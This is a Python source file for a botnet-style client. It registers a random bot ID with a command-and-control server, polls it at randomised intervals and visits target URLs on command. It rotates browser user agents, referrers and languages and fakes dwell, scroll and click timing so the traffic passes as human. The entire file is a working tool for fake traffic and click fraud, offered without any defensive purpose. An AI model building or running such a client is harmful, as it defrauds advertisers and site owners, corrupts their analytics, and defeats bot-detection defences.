import asyncio
import httpx
import random
import json
import logging
from typing import List, Dict, Any, Optional
from datetime import datetime
import hashlib

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Configuration ---
C2_SERVER_URL = "http://localhost:5000"
C2_ENDPOINT = "/c2/get_command"
BOT_ID = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
MAX_CONCURRENT_TASKS = 10
REQUEST_TIMEOUT = 30
C2_CHECK_INTERVAL = (30, 90)  # Random interval between 30-90 seconds

# --- Advanced User-Agent Pool ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

# --- Referer Pool for Realistic Traffic ---
REFERRERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://www.reddit.com/",
    "https://www.twitter.com/",
    "https://www.youtube.com/",
    "https://www.instagram.com/",
]

# --- Accept-Language Pool ---
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en-AU,en;q=0.8",
    "de-DE,de;q=0.9",
    "fr-FR,fr;q=0.9",
    "es-ES,es;q=0.9",
    "ja-JP,ja;q=0.9",
]


class BotClient:
    """
    Advanced asynchronous bot client with intelligent command execution,
    adaptive behavior, and realistic traffic generation.
    """

    def __init__(self, c2_url: str = C2_SERVER_URL, bot_id: str = BOT_ID):
        self.c2_url = c2_url
        self.bot_id = bot_id
        self.session: Optional[httpx.AsyncClient] = None
        self.command_queue: asyncio.Queue = asyncio.Queue()
        self.active_tasks: set = set()
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "total_bytes_transferred": 0,
            "c2_check_ins": 0,
            "commands_executed": 0,
        }
        logger.info(f"[*] Bot initialized with ID: {self.bot_id}")

    async def __aenter__(self):
        """Context manager entry."""
        self.session = httpx.AsyncClient(
            timeout=REQUEST_TIMEOUT,
            follow_redirects=True,
            limits=httpx.Limits(max_connections=MAX_CONCURRENT_TASKS),
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        if self.session:
            await self.session.aclose()

    def _get_realistic_headers(self, referer: Optional[str] = None) -> Dict[str, str]:
        """
        Generate realistic HTTP headers with randomized values.
        """
        user_agent = random.choice(USER_AGENTS)
        accept_language = random.choice(ACCEPT_LANGUAGES)
        
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": accept_language,
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
        }
        
        if referer:
            headers["Referer"] = referer
        
        return headers

    async def execute_visit_command(self, target_url: str, dwell_time: Optional[float] = None) -> bool:
        """
        Execute a VISIT command with realistic behavior.
        """
        if not self.session:
            logger.error("[-] Session not initialized")
            return False

        try:
            referer = random.choice(REFERRERS)
            headers = self._get_realistic_headers(referer=referer)
            
            logger.info(f"[*] Visiting: {target_url}")
            
            response = await self.session.get(target_url, headers=headers)
            self.stats["total_requests"] += 1
            self.stats["total_bytes_transferred"] += len(response.content)
            
            if response.status_code == 200:
                self.stats["successful_requests"] += 1
                logger.info(f"[+] Visit successful. Status: {response.status_code}, Size: {len(response.content)} bytes")
            else:
                logger.warning(f"[!] Unexpected status code: {response.status_code}")
            
            # Simulate realistic dwell time
            if dwell_time is None:
                dwell_time = random.uniform(3, 20)
            
            logger.info(f"[*] Simulating dwell time: {dwell_time:.2f} seconds")
            await asyncio.sleep(dwell_time)
            
            return True

        except httpx.RequestError as e:
            self.stats["failed_requests"] += 1
            logger.error(f"[-] Request failed: {e}")
            return False

    async def execute_click_command(self, target_url: str, selector: str) -> bool:
        """
        Simulate a click action (visit URL and simulate interaction).
        """
        logger.info(f"[*] Simulating click on selector: {selector}")
        # In a real implementation, this would use a headless browser like Selenium or Playwright
        # For now, we simulate by visiting the URL
        return await self.execute_visit_command(target_url)

    async def execute_scroll_command(self, target_url: str, scroll_depth: float = 0.8) -> bool:
        """
        Simulate scrolling behavior on a page.
        """
        logger.info(f"[*] Simulating scroll to {scroll_depth*100:.0f}% depth")
        # Simulate scrolling by visiting and dwelling
        return await self.execute_visit_command(target_url, dwell_time=random.uniform(5, 15))

    async def execute_command(self, command: Dict[str, Any]) -> bool:
        """
        Execute a command from the C2 server.
        """
        action = command.get("action", "").upper()
        
        if action == "VISIT":
            target_url = command.get("target_url")
            dwell_time = command.get("dwell_time")
            return await self.execute_visit_command(target_url, dwell_time)
        
        elif action == "CLICK":
            target_url = command.get("target_url")
            selector = command.get("selector", "body")
            return await self.execute_click_command(target_url, selector)
        
        elif action == "SCROLL":
            target_url = command.get("target_url")
            scroll_depth = command.get("scroll_depth", 0.8)
            return await self.execute_scroll_command(target_url, scroll_depth)
        
        elif action == "SLEEP":
            sleep_time = command.get("time", 5)
            logger.info(f"[*] Sleeping for {sleep_time} seconds")
            await asyncio.sleep(sleep_time)
            return True
        
        elif action == "SEQUENCE":
            # Execute a sequence of commands
            commands = command.get("commands", [])
            logger.info(f"[*] Executing sequence of {len(commands)} commands")
            for sub_command in commands:
                success = await self.execute_command(sub_command)
                if not success:
                    logger.warning("[!] Sequence command failed, continuing...")
            return True
        
        elif action == "STOP":
            logger.info("[*] Received STOP command")
            return False
        
        else:
            logger.warning(f"[!] Unknown action: {action}")
            return False

    async def fetch_commands_from_c2(self) -> Optional[List[Dict[str, Any]]]:
        """
        Fetch commands from the C2 server.
        """
        if not self.session:
            logger.error("[-] Session not initialized")
            return None

        try:
            headers = self._get_realistic_headers()
            url = f"{self.c2_url}{C2_ENDPOINT}?bot_id={self.bot_id}"
            
            logger.info(f"[*] Checking in with C2: {url}")
            response = await self.session.get(url, headers=headers)
            self.stats["c2_check_ins"] += 1
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get("commands", [])
                logger.info(f"[+] Received {len(commands)} command(s) from C2")
                return commands
            else:
                logger.warning(f"[!] C2 check-in failed with status: {response.status_code}")
                return None

        except (httpx.RequestError, json.JSONDecodeError) as e:
            logger.error(f"[-] Error fetching commands: {e}")
            return None

    async def execute_commands_concurrently(self, commands: List[Dict[str, Any]]) -> None:
        """
        Execute multiple commands concurrently with a semaphore to limit concurrency.
        """
        semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

        async def bounded_execute(cmd):
            async with semaphore:
                self.stats["commands_executed"] += 1
                return await self.execute_command(cmd)

        tasks = [bounded_execute(cmd) for cmd in commands]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful = sum(1 for r in results if r is True)
        logger.info(f"[+] Executed {successful}/{len(commands)} commands successfully")

    async def main_loop(self) -> None:
        """
        Main bot loop: continuously check C2 for commands and execute them.
        """
        logger.info("[*] Starting main bot loop")
        
        while True:
            try:
                # Fetch commands from C2
                commands = await self.fetch_commands_from_c2()
                
                if commands:
                    # Execute commands concurrently
                    await self.execute_commands_concurrently(commands)
                else:
                    logger.info("[*] No commands received from C2")
                
                # Wait before next C2 check
                wait_time = random.uniform(*C2_CHECK_INTERVAL)
                logger.info(f"[*] Waiting {wait_time:.2f} seconds before next C2 check")
                await asyncio.sleep(wait_time)

            except asyncio.CancelledError:
                logger.info("[*] Bot loop cancelled")
                break
            except Exception as e:
                logger.error(f"[-] Unexpected error in main loop: {e}")
                await asyncio.sleep(random.uniform(60, 120))

    def print_stats(self) -> None:
        """
        Print bot statistics.
        """
        logger.info("=" * 60)
        logger.info("BOT STATISTICS")
        logger.info("=" * 60)
        logger.info(f"Bot ID: {self.bot_id}")
        logger.info(f"Total Requests: {self.stats['total_requests']}")
        logger.info(f"Successful Requests: {self.stats['successful_requests']}")
        logger.info(f"Failed Requests: {self.stats['failed_requests']}")
        logger.info(f"Total Bytes Transferred: {self.stats['total_bytes_transferred']:,}")
        logger.info(f"C2 Check-ins: {self.stats['c2_check_ins']}")
        logger.info(f"Commands Executed: {self.stats['commands_executed']}")
        logger.info("=" * 60)


async def main():
    """
    Entry point for the bot client.
    """
    async with BotClient() as bot:
        try:
            await bot.main_loop()
        except KeyboardInterrupt:
            logger.info("[*] Bot interrupted by user")
            bot.print_stats()


if __name__ == "__main__":
    asyncio.run(main())
